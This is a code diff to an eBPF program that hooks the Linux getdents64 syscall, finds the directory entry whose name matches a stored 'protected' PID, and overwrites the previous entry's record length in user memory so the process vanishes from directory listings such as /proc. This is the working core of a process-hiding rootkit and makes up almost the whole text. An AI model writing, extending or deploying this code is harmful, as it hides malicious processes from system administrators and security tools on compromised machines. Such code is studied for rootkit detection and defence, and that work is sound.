@@ -28,6 +28,20 @@ struct {
     __type(value, __u32);
 } map_bytes_read SEC(".maps");
 
+struct {
+    __uint(type, BPF_MAP_TYPE_HASH);
+    __uint(max_entries, 8192);
+    __type(key, __u64);
+    __type(value, __u64);
+} map_to_patch SEC(".maps");
+
+struct {
+    __uint(type, BPF_MAP_TYPE_PROG_ARRAY);
+    __uint(max_entries, 5);
+    __type(key, __u32);
+    __type(value, __u32);
+} map_prog_array SEC(".maps");
+
 // Must always include a license
 char LICENSE[] SEC("license") = "GPL";
 
@@ -80,6 +94,20 @@ int enter_getdents64(struct pt_regs *ctx)
     return 0;
 }
 
+static __always_inline void patch_dirent(struct linux_dirent64 *prev, __u16 offset)
+{
+    // Add the offset to the previous dirent to skip our entry we want to hide
+    __u16 prev_d_reclen = 0;
+    int ret = bpf_probe_read_user(&prev_d_reclen, sizeof(prev_d_reclen), &prev->d_reclen);
+    if (ret != 0) {
+        bpf_printk("Failed to read prev d_reclen: %d", ret);
+    }
+    bpf_printk("Extending prev d_reclen of %u by %u", prev_d_reclen, offset);
+    
+    prev_d_reclen += offset;
+    bpf_probe_write_user(&prev->d_reclen, &prev_d_reclen, sizeof(prev_d_reclen));
+}
+
 SEC("kretprobe/__x64_sys_getdents64")
 int exit_getdents64(struct pt_regs *ctx)
 {
@@ -89,6 +117,10 @@ int exit_getdents64(struct pt_regs *ctx)
         return 0;
     }
 
+    // Get the PID to block access to
+    __u32 key = 0;
+    __u32 *blocked_pid_ptr = bpf_map_lookup_elem(&loader_pid, &key);
+
     // Get the stored dirent pointer from kprobe
     __u64 pid_tgid = bpf_get_current_pid_tgid();
     __u64 *buf = bpf_map_lookup_elem(&map_bufs, &pid_tgid);
@@ -97,10 +129,9 @@ int exit_getdents64(struct pt_regs *ctx)
         return 0;
     }
 
-    bpf_printk("kretprobe found dirents starting at: %llX", *buf);
-
     // Loop variables
-    struct linux_dirent64 *dirent;
+    struct linux_dirent64 *dirent = 0;
+    struct linux_dirent64 *prev_dirent = 0;
     __u16 d_reclen;
     char filename[64];
 
@@ -111,22 +142,52 @@ int exit_getdents64(struct pt_regs *ctx)
     }
 
     // Read first entry
-    bpf_printk("Attempting read...");
-    dirent = (struct linux_dirent64 *)(*buf);
-    err = bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirent->d_reclen);
-    if(err!= 0) {
-        bpf_printk("kretprobe __x64_sys_getdents64 coulnd't read dirent->d_reclen: %d", err);
-        return 0;
-    }
-    int len = bpf_probe_read_user_str(&filename, sizeof(filename), dirent->d_name);
-    if (len < 0) {
-        bpf_printk("kretprobe __x64_sys_getdents64 coulnd't read dirent->d_name: %d", len);
-        return 0;
-    }
+    for (int i = 0; i < 1024; i++) {
+        // Check if we've read everything
+        if (buf_pos >= ret) {
+            return 0;
+        }
 
-    bpf_printk("Maybe worked?");
-    bpf_printk("d_reclen %u filename %s", d_reclen, filename);
+        // Advance to the next directory entry in the buffer
+        dirent = (struct linux_dirent64 *)(*buf + buf_pos);
 
+        // Safely read the directory entry size
+        err = bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirent->d_reclen);
+        if(err!= 0) {
+            bpf_printk("kretprobe __x64_sys_getdents64 coulnd't read dirent->d_reclen: %d", err);
+            return 0;
+        }
+
+        // Safely read the directory name
+        int len = bpf_probe_read_user_str(&filename, sizeof(filename), dirent->d_name);
+        if (len < 0) {
+            bpf_printk("kretprobe __x64_sys_getdents64 coulnd't read dirent->d_name: %d", len);
+            return 0;
+        }
+
+        // Verbose logging:
+        // bpf_printk("d_reclen %u filename %s", d_reclen, filename);
+
+        // Compare the filename with the PID to block
+        unsigned long result;
+        long res = bpf_strtoul(filename, sizeof(filename), 10, &result);
+        if (res >= 0) {
+            if (result == *blocked_pid_ptr) {
+                bpf_printk("Blocking getdents64 to protected PID: %u", *blocked_pid_ptr);
+
+                bpf_map_delete_elem(&map_bufs, &pid_tgid);
+                bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
+                patch_dirent(prev_dirent, d_reclen);
+                return 0;
+            }
+        }
+
+        // Store previous dirent for patching
+        prev_dirent = dirent;
+        
+        // Add to offset for next read
+        buf_pos += d_reclen;
+    }
 
     // Cleanup
     bpf_map_delete_elem(&map_bufs, &pid_tgid);
